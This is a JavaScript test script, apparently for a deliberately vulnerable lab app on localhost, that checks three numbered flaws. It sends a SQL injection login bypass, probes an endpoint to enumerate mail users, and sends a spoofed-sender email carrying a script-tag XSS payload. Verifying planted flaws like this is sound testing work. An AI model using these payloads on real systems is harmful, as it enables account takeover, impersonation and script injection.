async function runTests() {
  console.log("=== 1. Testing SQLi Login Bypass (V28) ===");
  const loginRes = await fetch("http://localhost:3000/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "admin'--", password: "arbitrary_password" }),
  });
  console.log("Status:", loginRes.status);
  console.log("Headers:", Object.fromEntries(loginRes.headers.entries()));
  const loginData = await loginRes.json();
  console.log("Login Response:", loginData);

  console.log("\n=== 2. Testing SMTP VRFY User Enumeration (V31) ===");
  const vrfyValid = await fetch("http://localhost:3000/api/mail/vrfy?email=g.prasanth@911-airliner.com");
  console.log("Valid user status:", vrfyValid.status, "Body:", (await vrfyValid.text()).trim());

  const vrfyInvalid = await fetch("http://localhost:3000/api/mail/vrfy?email=notauser@911-airliner.com");
  console.log("Invalid user status:", vrfyInvalid.status, "Body:", (await vrfyInvalid.text()).trim());

  console.log("\n=== 3. Testing SMTP Relay / Spoofing (V30) ===");
  const relayRes = await fetch("http://localhost:3000/api/mail", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      from: "b.kumaran@911-airliner.com",
      to: "k.pilo@911-airliner.com",
      subject: "Test Spoofed Message",
      body: "<p>Emergency notice.</p><script>console.log('XSS triggered');</script>",
    }),
  });
  console.log("Relay status:", relayRes.status, await relayRes.json());
}

runTests().catch(console.error);
